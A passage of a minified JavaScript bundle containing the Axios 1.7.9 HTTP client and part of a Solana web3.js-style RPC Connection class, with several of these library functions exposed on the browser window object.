e=Date.now(),a=e-i;a>=o?s(t,e):(r=t,n||(n=setTimeout((()=>{n=null,s(r)}),o-a)))},()=>r&&s(r)]}((r=>{const o=r.loaded,s=r.lengthComputable?r.total:void 0,a=o-n,c=i(a);n=o,t({loaded:o,total:s,progress:s?o/s:void 0,bytes:a,rate:c||void 0,estimated:c&&s&&o<=s?(s-o)/c:void 0,event:r,lengthComputable:null!=s,[e?"download":"upload"]:!0})}),r)},Lc=(t,e)=>{const r=null!=t;return[n=>e[0]({lengthComputable:r,total:t,loaded:n}),e[1]]},Nc=t=>(...e)=>Va.asap((()=>t(...e))),Uc=wc.hasStandardBrowserEnv?((t,e)=>r=>(r=new URL(r,wc.origin),t.protocol===r.protocol&&t.host===r.host&&(e||t.port===r.port)))(new URL(wc.origin),wc.navigator&&/(msie|trident)/i.test(wc.navigator.userAgent)):()=>!0,zc=wc.hasStandardBrowserEnv?{write(t,e,r,n,i,o){const s=[t+"="+encodeURIComponent(e)];Va.isNumber(r)&&s.push("expires="+new Date(r).toGMTString()),Va.isString(n)&&s.push("path="+n),Va.isString(i)&&s.push("domain="+i),!0===o&&s.push("secure"),document.cookie=s.join("; ")},read(t){const e=document.cookie.match(new RegExp("(^|;\\s*)("+t+")=([^;]*)"));return e?decodeURIComponent(e[3]):null},remove(t){this.write(t,"",Date.now()-864e5)}}:{write(){},read:()=>null,remove(){}};function Dc(t,e){return t&&!/^([a-z][a-z\d+\-.]*:)?\/\//i.test(e)?function(t,e){return e?t.replace(/\/?\/$/,"")+"/"+e.replace(/^\/+/,""):t}(t,e):e}const jc=t=>t instanceof xc?{...t}:t;function Wc(t,e){e=e||{};const r={};function n(t,e,r,n){return Va.isPlainObject(t)&&Va.isPlainObject(e)?Va.merge.call({caseless:n},t,e):Va.isPlainObject(e)?Va.merge({},e):Va.isArray(e)?e.slice():e}function i(t,e,r,i){return Va.isUndefined(e)?Va.isUndefined(t)?void 0:n(void 0,t,0,i):n(t,e,0,i)}function o(t,e){if(!Va.isUndefined(e))return n(void 0,e)}function s(t,e){return Va.isUndefined(e)?Va.isUndefined(t)?void 0:n(void 0,t):n(void 0,e)}function a(r,i,o){return o in e?n(r,i):o in t?n(void 0,r):void 0}const c={url:o,method:o,data:o,baseURL:s,transformRequest:s,transformResponse:s,paramsSerializer:s,timeout:s,timeoutMessage:s,withCredentials:s,withXSRFToken:s,adapter:s,responseType:s,xsrfCookieName:s,xsrfHeaderName:s,onUploadProgress:s,onDownloadProgress:s,decompress:s,maxContentLength:s,maxBodyLength:s,beforeRedirect:s,transport:s,httpAgent:s,httpsAgent:s,cancelToken:s,socketPath:s,responseEncoding:s,validateStatus:a,headers:(t,e,r)=>i(jc(t),jc(e),0,!0)};return Va.forEach(Object.keys(Object.assign({},t,e)),(function(n){const o=c[n]||i,s=o(t[n],e[n],n);Va.isUndefined(s)&&o!==a||(r[n]=s)})),r}const qc=t=>{const e=Wc({},t);let r,{data:n,withXSRFToken:i,xsrfHeaderName:o,xsrfCookieName:s,headers:a,auth:c}=e;if(e.headers=a=xc.from(a),e.url=uc(Dc(e.baseURL,e.url),t.params,t.paramsSerializer),c&&a.set("Authorization","Basic "+btoa((c.username||"")+":"+(c.password?unescape(encodeURIComponent(c.password)):""))),Va.isFormData(n))if(wc.hasStandardBrowserEnv||wc.hasStandardBrowserWebWorkerEnv)a.setContentType(void 0);else if(!1!==(r=a.getContentType())){const[t,...e]=r?r.split(";").map((t=>t.trim())).filter(Boolean):[];a.setContentType([t||"multipart/form-data",...e].join("; "))}if(wc.hasStandardBrowserEnv&&(i&&Va.isFunction(i)&&(i=i(e)),i||!1!==i&&Uc(e.url))){const t=o&&s&&zc.read(s);t&&a.set(o,t)}return e},Fc="undefined"!=typeof XMLHttpRequest&&function(t){return new Promise((function(e,r){const n=qc(t);let i=n.data;const o=xc.from(n.headers).normalize();let s,a,c,u,h,{responseType:l,onUploadProgress:f,onDownloadProgress:d}=n;function p(){u&&u(),h&&h(),n.cancelToken&&n.cancelToken.unsubscribe(s),n.signal&&n.signal.removeEventListener("abort",s)}let g=new XMLHttpRequest;function m(){if(!g)return;const n=xc.from("getAllResponseHeaders"in g&&g.getAllResponseHeaders());Pc((function(t){e(t),p()}),(function(t){r(t),p()}),{data:l&&"text"!==l&&"json"!==l?g.response:g.responseText,status:g.status,statusText:g.statusText,headers:n,config:t,request:g}),g=null}g.open(n.method.toUpperCase(),n.url,!0),g.timeout=n.timeout,"onloadend"in g?g.onloadend=m:g.onreadystatechange=function(){g&&4===g.readyState&&(0!==g.status||g.responseURL&&0===g.responseURL.indexOf("file:"))&&setTimeout(m)},g.onabort=function(){g&&(r(new Ya("Request aborted",Ya.ECONNABORTED,t,g)),g=null)},g.onerror=function(){r(new Ya("Network Error",Ya.ERR_NETWORK,t,g)),g=null},g.ontimeout=function(){let e=n.timeout?"timeout of "+n.timeout+"ms exceeded":"timeout exceeded";const i=n.transitional||lc;n.timeoutErrorMessage&&(e=n.timeoutErrorMessage),r(new Ya(e,i.clarifyTimeoutError?Ya.ETIMEDOUT:Ya.ECONNABORTED,t,g)),g=null},void 0===i&&o.setContentType(null),"setRequestHeader"in g&&Va.forEach(o.toJSON(),(function(t,e){g.setRequestHeader(e,t)})),Va.isUndefined(n.withCredentials)||(g.withCredentials=!!n.withCredentials),l&&"json"!==l&&(g.responseType=n.responseType),d&&([c,h]=Cc(d,!0),g.addEventListener("progress",c)),f&&g.upload&&([a,u]=Cc(f),g.upload.addEventListener("progress",a),g.upload.addEventListener("loadend",u)),(n.cancelToken||n.signal)&&(s=e=>{g&&(r(!e||e.type?new Rc(null,t,g):e),g.abort(),g=null)},n.cancelToken&&n.cancelToken.subscribe(s),n.signal&&(n.signal.aborted?s():n.signal.addEventListener("abort",s)));const y=function(t){const e=/^([-+\w]{1,25})(:?\/\/|:)/.exec(t);return e&&e[1]||""}(n.url);y&&-1===wc.protocols.indexOf(y)?r(new Ya("Unsupported protocol "+y+":",Ya.ERR_BAD_REQUEST,t)):g.send(i||null)}))},Hc=(t,e)=>{const{length:r}=t=t?t.filter(Boolean):[];if(e||r){let r,n=new AbortController;const i=function(t){if(!r){r=!0,s();const e=t instanceof Error?t:this.reason;n.abort(e instanceof Ya?e:new Rc(e instanceof Error?e.message:e))}};let o=e&&setTimeout((()=>{o=null,i(new Ya(`timeout ${e} of ms exceeded`,Ya.ETIMEDOUT))}),e);const s=()=>{t&&(o&&clearTimeout(o),o=null,t.forEach((t=>{t.unsubscribe?t.unsubscribe(i):t.removeEventListener("abort",i)})),t=null)};t.forEach((t=>t.addEventListener("abort",i)));const{signal:a}=n;return a.unsubscribe=()=>Va.asap(s),a}},Kc=function*(t,e){let r=t.byteLength;if(!e||r<e)return void(yield t);let n,i=0;for(;i<r;)n=i+e,yield t.slice(i,n),i=n},$c=(t,e,r,n)=>{const i=async function*(t,e){for await(const r of async function*(t){if(t[Symbol.asyncIterator])return void(yield*t);const e=t.getReader();try{for(;;){const{done:t,value:r}=await e.read();if(t)break;yield r}}finally{await e.cancel()}}(t))yield*Kc(r,e)}(t,e);let o,s=0,a=t=>{o||(o=!0,n&&n(t))};return new ReadableStream({async pull(t){try{const{done:e,value:n}=await i.next();if(e)return a(),void t.close();let o=n.byteLength;if(r){let t=s+=o;r(t)}t.enqueue(new Uint8Array(n))}catch(t){throw a(t),t}},cancel:t=>(a(t),i.return())},{highWaterMark:2})},Vc="function"==typeof fetch&&"function"==typeof Request&&"function"==typeof Response,Gc=Vc&&"function"==typeof ReadableStream,Jc=Vc&&("function"==typeof TextEncoder?(Zc=new TextEncoder,t=>Zc.encode(t)):async t=>new Uint8Array(await new Response(t).arrayBuffer()));var Zc;const Yc=(t,...e)=>{try{return!!t(...e)}catch(t){return!1}},Xc=Gc&&Yc((()=>{let t=!1;const e=new Request(wc.origin,{body:new ReadableStream,method:"POST",get duplex(){return t=!0,"half"}}).headers.has("Content-Type");return t&&!e})),Qc=Gc&&Yc((()=>Va.isReadableStream(new Response("").body))),tu={stream:Qc&&(t=>t.body)};var eu;Vc&&(eu=new Response,["text","arrayBuffer","blob","formData","stream"].forEach((t=>{!tu[t]&&(tu[t]=Va.isFunction(eu[t])?e=>e[t]():(e,r)=>{throw new Ya(`Response type '${t}' is not supported`,Ya.ERR_NOT_SUPPORT,r)})})));const ru={http:null,xhr:Fc,fetch:Vc&&(async t=>{let{url:e,method:r,data:n,signal:i,cancelToken:o,timeout:s,onDownloadProgress:a,onUploadProgress:c,responseType:u,headers:h,withCredentials:l="same-origin",fetchOptions:f}=qc(t);u=u?(u+"").toLowerCase():"text";let d,p=Hc([i,o&&o.toAbortSignal()],s);const g=p&&p.unsubscribe&&(()=>{p.unsubscribe()});let m;try{if(c&&Xc&&"get"!==r&&"head"!==r&&0!==(m=await(async(t,e)=>{const r=Va.toFiniteNumber(t.getContentLength());return null==r?(async t=>{if(null==t)return 0;if(Va.isBlob(t))return t.size;if(Va.isSpecCompliantForm(t)){const e=new Request(wc.origin,{method:"POST",body:t});return(await e.arrayBuffer()).byteLength}return Va.isArrayBufferView(t)||Va.isArrayBuffer(t)?t.byteLength:(Va.isURLSearchParams(t)&&(t+=""),Va.isString(t)?(await Jc(t)).byteLength:void 0)})(e):r})(h,n))){let t,r=new Request(e,{method:"POST",body:n,duplex:"half"});if(Va.isFormData(n)&&(t=r.headers.get("content-type"))&&h.setContentType(t),r.body){const[t,e]=Lc(m,Cc(Nc(c)));n=$c(r.body,65536,t,e)}}Va.isString(l)||(l=l?"include":"omit");const i="credentials"in Request.prototype;d=new Request(e,{...f,signal:p,method:r.toUpperCase(),headers:h.normalize().toJSON(),body:n,duplex:"half",credentials:i?l:void 0});let o=await fetch(d);const s=Qc&&("stream"===u||"response"===u);if(Qc&&(a||s&&g)){const t={};["status","statusText","headers"].forEach((e=>{t[e]=o[e]}));const e=Va.toFiniteNumber(o.headers.get("content-length")),[r,n]=a&&Lc(e,Cc(Nc(a),!0))||[];o=new Response($c(o.body,65536,r,(()=>{n&&n(),g&&g()})),t)}u=u||"text";let y=await tu[Va.findKey(tu,u)||"text"](o,t);return!s&&g&&g(),await new Promise(((e,r)=>{Pc(e,r,{data:y,headers:xc.from(o.headers),status:o.status,statusText:o.statusText,config:t,request:d})}))}catch(e){if(g&&g(),e&&"TypeError"===e.name&&/fetch/i.test(e.message))throw Object.assign(new Ya("Network Error",Ya.ERR_NETWORK,t,d),{cause:e.cause||e});throw Ya.from(e,e&&e.code,t,d)}})};Va.forEach(ru,((t,e)=>{if(t){try{Object.defineProperty(t,"name",{value:e})}catch(t){}Object.defineProperty(t,"adapterName",{value:e})}}));const nu=t=>`- ${t}`,iu=t=>Va.isFunction(t)||null===t||!1===t,ou=t=>{t=Va.isArray(t)?t:[t];const{length:e}=t;let r,n;const i={};for(let o=0;o<e;o++){let e;if(r=t[o],n=r,!iu(r)&&(n=ru[(e=String(r)).toLowerCase()],void 0===n))throw new Ya(`Unknown adapter '${e}'`);if(n)break;i[e||"#"+o]=n}if(!n){const t=Object.entries(i).map((([t,e])=>`adapter ${t} `+(!1===e?"is not supported by the environment":"is not available in the build")));let r=e?t.length>1?"since :\n"+t.map(nu).join("\n"):" "+nu(t[0]):"as no adapter specified";throw new Ya("There is no suitable adapter to dispatch the request "+r,"ERR_NOT_SUPPORT")}return n};function su(t){if(t.cancelToken&&t.cancelToken.throwIfRequested(),t.signal&&t.signal.aborted)throw new Rc(null,t)}function au(t){return su(t),t.headers=xc.from(t.headers),t.data=Mc.call(t,t.transformRequest),-1!==["post","put","patch"].indexOf(t.method)&&t.headers.setContentType("application/x-www-form-urlencoded",!1),ou(t.adapter||kc.adapter)(t).then((function(e){return su(t),e.data=Mc.call(t,t.transformResponse,e),e.headers=xc.from(e.headers),e}),(function(e){return Oc(e)||(su(t),e&&e.response&&(e.response.data=Mc.call(t,t.transformResponse,e.response),e.response.headers=xc.from(e.response.headers))),Promise.reject(e)}))}const cu={};["object","boolean","number","function","string","symbol"].forEach(((t,e)=>{cu[t]=function(r){return typeof r===t||"a"+(e<1?"n ":" ")+t}}));const uu={};cu.transitional=function(t,e,r){function n(t,e){return"[Axios v1.7.9] Transitional option '"+t+"'"+e+(r?". "+r:"")}return(r,i,o)=>{if(!1===t)throw new Ya(n(i," has been removed"+(e?" in "+e:"")),Ya.ERR_DEPRECATED);return e&&!uu[i]&&(uu[i]=!0,console.warn(n(i," has been deprecated since v"+e+" and will be removed in the near future"))),!t||t(r,i,o)}},cu.spelling=function(t){return(e,r)=>(console.warn(`${r} is likely a misspelling of ${t}`),!0)};const hu={assertOptions:function(t,e,r){if("object"!=typeof t)throw new Ya("options must be an object",Ya.ERR_BAD_OPTION_VALUE);const n=Object.keys(t);let i=n.length;for(;i-- >0;){const o=n[i],s=e[o];if(s){const e=t[o],r=void 0===e||s(e,o,t);if(!0!==r)throw new Ya("option "+o+" must be "+r,Ya.ERR_BAD_OPTION_VALUE)}else if(!0!==r)throw new Ya("Unknown option "+o,Ya.ERR_BAD_OPTION)}},validators:cu},lu=hu.validators;class fu{constructor(t){this.defaults=t,this.interceptors={request:new hc,response:new hc}}async request(t,e){try{return await this._request(t,e)}catch(t){if(t instanceof Error){let e={};Error.captureStackTrace?Error.captureStackTrace(e):e=new Error;const r=e.stack?e.stack.replace(/^.+\n/,""):"";try{t.stack?r&&!String(t.stack).endsWith(r.replace(/^.+\n.+\n/,""))&&(t.stack+="\n"+r):t.stack=r}catch(t){}}throw t}}_request(t,e){"string"==typeof t?(e=e||{}).url=t:e=t||{},e=Wc(this.defaults,e);const{transitional:r,paramsSerializer:n,headers:i}=e;void 0!==r&&hu.assertOptions(r,{silentJSONParsing:lu.transitional(lu.boolean),forcedJSONParsing:lu.transitional(lu.boolean),clarifyTimeoutError:lu.transitional(lu.boolean)},!1),null!=n&&(Va.isFunction(n)?e.paramsSerializer={serialize:n}:hu.assertOptions(n,{encode:lu.function,serialize:lu.function},!0)),hu.assertOptions(e,{baseUrl:lu.spelling("baseURL"),withXsrfToken:lu.spelling("withXSRFToken")},!0),e.method=(e.method||this.defaults.method||"get").toLowerCase();let o=i&&Va.merge(i.common,i[e.method]);i&&Va.forEach(["delete","get","head","post","put","patch","common"],(t=>{delete i[t]})),e.headers=xc.concat(o,i);const s=[];let a=!0;this.interceptors.request.forEach((function(t){"function"==typeof t.runWhen&&!1===t.runWhen(e)||(a=a&&t.synchronous,s.unshift(t.fulfilled,t.rejected))}));const c=[];let u;this.interceptors.response.forEach((function(t){c.push(t.fulfilled,t.rejected)}));let h,l=0;if(!a){const t=[au.bind(this),void 0];for(t.unshift.apply(t,s),t.push.apply(t,c),h=t.length,u=Promise.resolve(e);l<h;)u=u.then(t[l++],t[l++]);return u}h=s.length;let f=e;for(l=0;l<h;){const t=s[l++],e=s[l++];try{f=t(f)}catch(t){e.call(this,t);break}}try{u=au.call(this,f)}catch(t){return Promise.reject(t)}for(l=0,h=c.length;l<h;)u=u.then(c[l++],c[l++]);return u}getUri(t){return uc(Dc((t=Wc(this.defaults,t)).baseURL,t.url),t.params,t.paramsSerializer)}}Va.forEach(["delete","get","head","options"],(function(t){fu.prototype[t]=function(e,r){return this.request(Wc(r||{},{method:t,url:e,data:(r||{}).data}))}})),Va.forEach(["post","put","patch"],(function(t){function e(e){return function(r,n,i){return this.request(Wc(i||{},{method:t,headers:e?{"Content-Type":"multipart/form-data"}:{},url:r,data:n}))}}fu.prototype[t]=e(),fu.prototype[t+"Form"]=e(!0)}));const du=fu;class pu{constructor(t){if("function"!=typeof t)throw new TypeError("executor must be a function.");let e;this.promise=new Promise((function(t){e=t}));const r=this;this.promise.then((t=>{if(!r._listeners)return;let e=r._listeners.length;for(;e-- >0;)r._listeners[e](t);r._listeners=null})),this.promise.then=t=>{let e;const n=new Promise((t=>{r.subscribe(t),e=t})).then(t);return n.cancel=function(){r.unsubscribe(e)},n},t((function(t,n,i){r.reason||(r.reason=new Rc(t,n,i),e(r.reason))}))}throwIfRequested(){if(this.reason)throw this.reason}subscribe(t){this.reason?t(this.reason):this._listeners?this._listeners.push(t):this._listeners=[t]}unsubscribe(t){if(!this._listeners)return;const e=this._listeners.indexOf(t);-1!==e&&this._listeners.splice(e,1)}toAbortSignal(){const t=new AbortController,e=e=>{t.abort(e)};return this.subscribe(e),t.signal.unsubscribe=()=>this.unsubscribe(e),t.signal}static source(){let t;return{token:new pu((function(e){t=e})),cancel:t}}}const gu=pu,mu={Continue:100,SwitchingProtocols:101,Processing:102,EarlyHints:103,Ok:200,Created:201,Accepted:202,NonAuthoritativeInformation:203,NoContent:204,ResetContent:205,PartialContent:206,MultiStatus:207,AlreadyReported:208,ImUsed:226,MultipleChoices:300,MovedPermanently:301,Found:302,SeeOther:303,NotModified:304,UseProxy:305,Unused:306,TemporaryRedirect:307,PermanentRedirect:308,BadRequest:400,Unauthorized:401,PaymentRequired:402,Forbidden:403,NotFound:404,MethodNotAllowed:405,NotAcceptable:406,ProxyAuthenticationRequired:407,RequestTimeout:408,Conflict:409,Gone:410,LengthRequired:411,PreconditionFailed:412,PayloadTooLarge:413,UriTooLong:414,UnsupportedMediaType:415,RangeNotSatisfiable:416,ExpectationFailed:417,ImATeapot:418,MisdirectedRequest:421,UnprocessableEntity:422,Locked:423,FailedDependency:424,TooEarly:425,UpgradeRequired:426,PreconditionRequired:428,TooManyRequests:429,RequestHeaderFieldsTooLarge:431,UnavailableForLegalReasons:451,InternalServerError:500,NotImplemented:501,BadGateway:502,ServiceUnavailable:503,GatewayTimeout:504,HttpVersionNotSupported:505,VariantAlsoNegotiates:506,InsufficientStorage:507,LoopDetected:508,NotExtended:510,NetworkAuthenticationRequired:511};Object.entries(mu).forEach((([t,e])=>{mu[e]=t}));const yu=mu,wu=function t(e){const r=new du(e),n=na(du.prototype.request,r);return Va.extend(n,du.prototype,r,{allOwnKeys:!0}),Va.extend(n,r,null,{allOwnKeys:!0}),n.create=function(r){return t(Wc(e,r))},n}(kc);wu.Axios=du,wu.CanceledError=Rc,wu.CancelToken=gu,wu.isCancel=Oc,wu.VERSION="1.7.9",wu.toFormData=nc,wu.AxiosError=Ya,wu.Cancel=wu.CanceledError,wu.all=function(t){return Promise.all(t)},wu.spread=function(t){return function(e){return t.apply(null,e)}},wu.isAxiosError=function(t){return Va.isObject(t)&&!0===t.isAxiosError},wu.mergeConfig=Wc,wu.AxiosHeaders=xc,wu.formToJSON=t=>bc(Va.isHTMLForm(t)?new FormData(t):t),wu.getAdapter=ou,wu.HttpStatusCode=yu,wu.default=wu;const bu=wu;window.serialize=function(t,e,r){return void 0===r&&(r=!0),r&&ea(t),new ra(r).encode(e,t)},window.BN=ie.BN,window.sha256=Ks,window.Buffer=n.Buffer,window.sendAndConfirmTransaction=Ln,window.Connection=class{constructor(t,e){let r,n,i,o,s,a;var c;this._commitment=void 0,this._confirmTransactionInitialTimeout=void 0,this._rpcEndpoint=void 0,this._rpcWsEndpoint=void 0,this._rpcClient=void 0,this._rpcRequest=void 0,this._rpcBatchRequest=void 0,this._rpcWebSocket=void 0,this._rpcWebSocketConnected=!1,this._rpcWebSocketHeartbeat=null,this._rpcWebSocketIdleTimeout=null,this._rpcWebSocketGeneration=0,this._disableBlockhashCaching=!1,this._pollingBlockhash=!1,this._blockhashInfo={latestBlockhash:null,lastFetch:0,transactionSignatures:[],simulatedSignatures:[]},this._nextClientSubscriptionId=0,this._subscriptionDisposeFunctionsByClientSubscriptionId={},this._subscriptionHashByClientSubscriptionId={},this._subscriptionStateChangeCallbacksByHash={},this._subscriptionCallbacksByServerSubscriptionId={},this._subscriptionsByHash={},this._subscriptionsAutoDisposedByRpc=new Set,this.getBlockHeight=(()=>{const t={};return async e=>{const{commitment:r,config:n}=ai(e),i=this._buildArgs([],r,void 0,n),o=Zn(i);return t[o]=t[o]??(async()=>{try{const t=Ue(await this._rpcRequest("getBlockHeight",i),li($e()));if("error"in t)throw new Cn(t.error,"failed to get block height information");return t.result}finally{delete t[o]}})(),await t[o]}})(),e&&"string"==typeof e?this._commitment=e:e&&(this._commitment=e.commitment,this._confirmTransactionInitialTimeout=e.confirmTransactionInitialTimeout,r=e.wsEndpoint,n=e.httpHeaders,i=e.fetch,o=e.fetchMiddleware,s=e.disableRetryOnRateLimit,a=e.httpAgent),this._rpcEndpoint=function(t){if(!1===/^https?:/.test(t))throw new TypeError("Endpoint URL must start with `http:` or `https:`.");return t}(t),this._rpcWsEndpoint=r||function(t){const e=t.match(ni);if(null==e)throw TypeError(`Failed to validate endpoint URL \`${t}\``);const[r,n,i,o]=e,s=t.startsWith("https:")?"wss:":"ws:",a=null==i?null:parseInt(i.slice(1),10);return`${s}//${n}${null==a?"":`:${a+1}`}${o}`}(t),this._rpcClient=function(t,e,r,n,i,o){const s=r||Qn;let a;return null!=o&&console.warn("You have supplied an `httpAgent` when creating a `Connection` in a browser environment.It has been ignored; `httpAgent` is only used in Node environments."),n&&(a=async(t,e)=>{const r=await new Promise(((r,i)=>{try{n(t,e,((t,e)=>r([t,e])))}catch(t){i(t)}}));return await s(...r)}),new(rr())((async(r,n)=>{const o={method:"POST",body:r,agent:void 0,headers:Object.assign({"Content-Type":"application/json"},e||{},Vo)};try{let e,r=5,c=500;for(;e=a?await a(t,o):await s(t,o),429===e.status&&!0!==i&&(r-=1,0!==r);)console.error(`Server responded with ${e.status} ${e.statusText}.  Retrying after ${c}ms delay...`),await Nn(c),c*=2;const u=await e.text();e.ok?n(null,u):n(new Error(`${e.status} ${e.statusText}: ${u}`))}catch(t){t instanceof Error&&n(t)}}),{})}(t,n,i,o,s,a),this._rpcRequest=(c=this._rpcClient,(t,e)=>new Promise(((r,n)=>{c.request(t,e,((t,e)=>{t?n(t):r(e)}))}))),this._rpcBatchRequest=function(t){return e=>new Promise(((r,n)=>{0===e.length&&r([]);const i=e.map((e=>t.request(e.methodName,e.args)));t.request(i,((t,e)=>{t?n(t):r(e)}))}))}(this._rpcClient),this._rpcWebSocket=new ti(this._rpcWsEndpoint,{autoconnect:!1,max_reconnects:1/0}),this._rpcWebSocket.on("open",this._wsOnOpen.bind(this)),this._rpcWebSocket.on("error",this._wsOnError.bind(this)),this._rpcWebSocket.on("close",this._wsOnClose.bind(this)),this._rpcWebSocket.on("accountNotification",this._wsOnAccountNotification.bind(this)),this._rpcWebSocket.on("programNotification",this._wsOnProgramAccountNotification.bind(this)),this._rpcWebSocket.on("slotNotification",this._wsOnSlotNotification.bind(this)),this._rpcWebSocket.on("slotsUpdatesNotification",this._wsOnSlotUpdatesNotification.bind(this)),this._rpcWebSocket.on("signatureNotification",this._wsOnSignatureNotification.bind(this)),this._rpcWebSocket.on("rootNotification",this._wsOnRootNotification.bind(this)),this._rpcWebSocket.on("logsNotification",this._wsOnLogsNotification.bind(this))}get commitment(){return this._commitment}get rpcEndpoint(){return this._rpcEndpoint}async getBalanceAndContext(t,e){const{commitment:r,config:n}=ai(e),i=this._buildArgs([t.toBase58()],r,void 0,n),o=Ue(await this._rpcRequest("getBalance",i),fi($e()));if("error"in o)throw new Cn(o.error,`failed to get balance for ${t.toBase58()}`);return o.result}async getBalance(t,e){return await this.getBalanceAndContext(t,e).then((t=>t.value)).catch((e=>{throw new Error("failed to get balance of account "+t.toBase58()+": "+e)}))}async getBlockTime(t){const e=Ue(await this._rpcRequest("getBlockTime",[t]),li(Ke($e())));if("error"in e)throw new Cn(e.error,`failed to get block time for slot ${t}`);return e.result}async getMinimumLedgerSlot(){const t=Ue(await this._rpcRequest("minimumLedgerSlot",[]),li($e()));if("error"in t)throw new Cn(t.error,"failed to get minimum ledger slot");return t.result}async getFirstAvailableBlock(){const t=Ue(await this._rpcRequest("getFirstAvailableBlock",[]),Ni);if("error"in t)throw new Cn(t.error,"failed to get first available block");return t.result}async getSupply(t){let e={};e="string"==typeof t?{commitment:t}:t?{...t,commitment:t&&t.commitment||this.commitment}:{commitment:this.commitment};const r=Ue(await this._rpcRequest("getSupply",[e]),Ui);if("error"in r)throw new Cn(r.error,"failed to get supply");return r.result}async getTokenSupply(t,e){const r=this._buildArgs([t.toBase58()],e),n=Ue(await this._rpcRequest("getTokenSupply",r),fi(zi));if("error"in n)throw new Cn(n.error,"failed to get token supply");return n.result}async getTokenAccountBalance(t,e){const r=this._buildArgs([t.toBase58()],e),n=Ue(await this._rpcRequest("getTokenAccountBalance",r),fi(zi));if("error"in n)throw new Cn(n.error,"failed to get token account balance");return n.result}async getTokenAccountsByOwner(t,e,r){const{commitment:n,config:i}=ai(r);let o=[t.toBase58()];"mint"in e?o.push({mint:e.mint.toBase58()}):o.push({programId:e.programId.toBase58()});const s=this._buildArgs(o,n,"base64",i),a=Ue(await this._rpcRequest("getTokenAccountsByOwner",s),ji);if("error"in a)throw new Cn(a.error,`failed to get token accounts owned by account ${t.toBase58()}`);return a.result}async getParsedTokenAccountsByOwner(t,e,r){let n=[t.toBase58()];"mint"in e?n.push({mint:e.mint.toBase58()}):n.push({programId:e.programId.toBase58()});const i=this._buildArgs(n,r,"jsonParsed"),o=Ue(await this._rpcRequest("getTokenAccountsByOwner",i),qi);if("error"in o)throw new Cn(o.error,`failed to get token accounts owned by account ${t.toBase58()}`);return o.result}async getLargestAccounts(t){const e={...t,commitment:t&&t.commitment||this.commitment},r=e.filter||e.commitment?[e]:[],n=Ue(await this._rpcRequest("getLargestAccounts",r),Fi);if("error"in n)throw new Cn(n.error,"failed to get largest accounts");return n.result}async getTokenLargestAccounts(t,e){const r=this._buildArgs([t.toBase58()],e),n=Ue(await this._rpcRequest("getTokenLargestAccounts",r),Di);if("error"in n)throw new Cn(n.error,"failed to get token largest accounts");return n.result}async getAccountInfoAndContext(t,e){const{commitment:r,config:n}=ai(e),i=this._buildArgs([t.toBase58()],r,"base64",n),o=Ue(await this._rpcRequest("getAccountInfo",i),fi(Ke(Hi)));if("error"in o)throw new Cn(o.error,`failed to get info about account ${t.toBase58()}`);return o.result}async getParsedAccountInfo(t,e){const{commitment:r,config:n}=ai(e),i=this._buildArgs([t.toBase58()],r,"jsonParsed",n),o=Ue(await this._rpcRequest("getAccountInfo",i),fi(Ke(Vi)));if("error"in o)throw new Cn(o.error,`failed to get info about account ${t.toBase58()}`);return o.result}async getAccountInfo(t,e){try{return(await this.getAccountInfoAndContext(t,e)).value}catch(e){throw new Error("failed to get info about account "+t.toBase58()+": "+e)}}async getMultipleParsedAccounts(t,e){const{commitment:r,config:n}=ai(e),i=t.map((t=>t.toBase58())),o=this._buildArgs([i],r,"jsonParsed",n),s=Ue(await this._rpcRequest("getMultipleAccounts",o),fi(We(Ke(Vi))));if("error"in s)throw new Cn(s.error,`failed to get info for accounts ${i}`);return s.result}async getMultipleAccountsInfoAndContext(t,e){const{commitment:r,config:n}=ai(e),i=t.map((t=>t.toBase58())),o=this._buildArgs([i],r,"base64",n),s=Ue(await this._rpcRequest("getMultipleAccounts",o),fi(We(Ke(Hi))));if("error"in s)throw new Cn(s.error,`failed to get info for accounts ${i}`);return s.result}async getMultipleAccountsInfo(t,e){return(await this.getMultipleAccountsInfoAndContext(t,e)).value}async getStakeActivation(t,e,r){const{commitment:n,config:i}=ai(e),o=this._buildArgs([t.toBase58()],n,void 0,{...i,epoch:null!=r?r:i?.epoch}),s=Ue(await this._rpcRequest("getStakeActivation",o),li(Ji));if("error"in s)throw new Cn(s.error,`failed to get Stake Activation ${t.toBase58()}`);return s.result}async getProgramAccounts(t,e){const{commitment:r,config:n}=ai(e),{encoding:i,...o}=n||{},s=this._buildArgs([t.toBase58()],r,i||"base64",{...o,...o.filters?{filters:ci(o.filters)}:null}),a=await this._rpcRequest("getProgramAccounts",s),c=We(Ki),u=!0===o.withContext?Ue(a,fi(c)):Ue(a,li(c));if("error"in u)throw new Cn(u.error,`failed to get accounts owned by program ${t.toBase58()}`);return u.result}async getParsedProgramAccounts(t,e){const{commitment:r,config:n}=ai(e),i=this._buildArgs([t.toBase58()],r,"jsonParsed",n),o=Ue(await this._rpcRequest("getProgramAccounts",i),li(We(Gi)));if("error"in o)throw new Cn(o.error,`failed to get accounts owned by program ${t.toBase58()}`);return o.result}async confirmTransaction(t,e){let r,n;if("string"==typeof t)r=t;else{const e=t;if(e.abortSignal?.aborted)return Promise.reject(e.abortSignal.reason);r=e.signature}try{n=ae().decode(r)}catch(t){throw new Error("signature must be base58 encoded: "+r)}return wn(64===n.length,"signature has invalid length"),"string"==typeof t?await this.confirmTransactionUsingLegacyTimeoutStrategy({commitment:e||this.commitment,signature:r}):"lastValidBlockHeight"in t?await this.confirmTransactionUsingBlockHeightExceedanceStrategy({commitment:e||this.commitment,strategy:t}):await this.confirmTransactionUsingDurableNonceStrategy({commitment:e||this.commitment,strategy:t})}getCancellationPromise(t){return new Promise(((e,r)=>{null!=t&&(t.aborted?r(t.reason):t.addEventListener("abort",(()=>{r(t.reason)})))}))}getTransactionConfirmationPromise({commitment:t,signature:e}){let r,n,i=!1;return{abortConfirmation:()=>{n&&(n(),n=void 0),null!=r&&(this.removeSignatureListener(r),r=void 0)},confirmationPromise:new Promise(((o,s)=>{try{r=this.onSignature(e,((t,e)=>{r=void 0;const n={context:e,value:t};o({__type:_n.PROCESSED,response:n})}),t);const a=new Promise((t=>{null==r?t():n=this._onSubscriptionStateChange(r,(e=>{"subscribed"===e&&t()}))}));(async()=>{if(await a,i)return;const r=await this.getSignatureStatus(e);if(i)return;if(null==r)return;const{context:n,value:c}=r;if(null!=c)if(c?.err)s(c.err);else{switch(t){case"confirmed":case"single":case"singleGossip":if("processed"===c.confirmationStatus)return;break;case"finalized":case"max":case"root":if("processed"===c.confirmationStatus||"confirmed"===c.confirmationStatus)return}i=!0,o({__type:_n.PROCESSED,response:{context:n,value:c}})}})()}catch(t){s(t)}}))}}async 